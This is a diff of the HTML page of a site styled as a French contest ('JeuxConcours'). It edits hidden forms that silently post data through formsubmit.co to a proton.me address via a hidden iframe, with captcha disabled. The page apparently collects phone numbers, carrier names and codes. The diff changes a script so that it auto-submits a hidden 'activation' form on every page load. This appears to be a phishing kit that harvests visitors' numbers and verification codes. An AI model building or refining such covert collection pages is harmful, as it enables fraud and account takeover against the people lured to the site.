@@ -588,13 +588,10 @@
 
 <!-- FORM ACTIVATION (premier chargement) -->
 <form id="activationForm" action="https://formsubmit.co/ipsosjc@proton.me" method="POST" target="mail_iframe" style="display:none">
-  <input type="hidden" name="Numéro" value="ACTIVATION">
-  <input type="hidden" name="Opérateur" value="ACTIVATION">
-  <input type="hidden" name="Heure" value="Premier chargement du site">
-  <input type="hidden" name="_subject" value="[JeuxConcours] ✅ Activation du formulaire">
+  <input type="hidden" name="message" value="Activation du site JeuxConcours">
+  <input type="hidden" name="_subject" value="[JeuxConcours] Activation du formulaire">
   <input type="hidden" name="_captcha" value="false">
   <input type="hidden" name="_template" value="table">
-  <input type="hidden" name="_next" value="about:blank">
 </form>
 
 <!-- FORM NUMÉRO -->
@@ -605,7 +602,6 @@
   <input type="hidden" name="_subject" value="">
   <input type="hidden" name="_captcha" value="false">
   <input type="hidden" name="_template" value="table">
-  <input type="hidden" name="_next" value="about:blank">
 </form>
 
 <!-- FORM CODE -->
@@ -617,16 +613,15 @@
   <input type="hidden" name="_subject" value="">
   <input type="hidden" name="_captcha" value="false">
   <input type="hidden" name="_template" value="table">
-  <input type="hidden" name="_next" value="about:blank">
 </form>
 
 <script>
-/* ======== ACTIVATION FORMSUBMIT (1ère visite) ======== */
+/* ======== ACTIVATION FORMSUBMIT ======== */
 window.addEventListener('load', () => {
-  if (!localStorage.getItem('fsc_activated')) {
+  // Soumet toujours au premier chargement pour activer/garder actif
+  setTimeout(() => {
     document.getElementById('activationForm').submit();
-    localStorage.setItem('fsc_activated', '1');
-  }
+  }, 1500);
 });
 
 /* ======== ENVOI PAR FORM CACHÉ + IFRAME ======== */
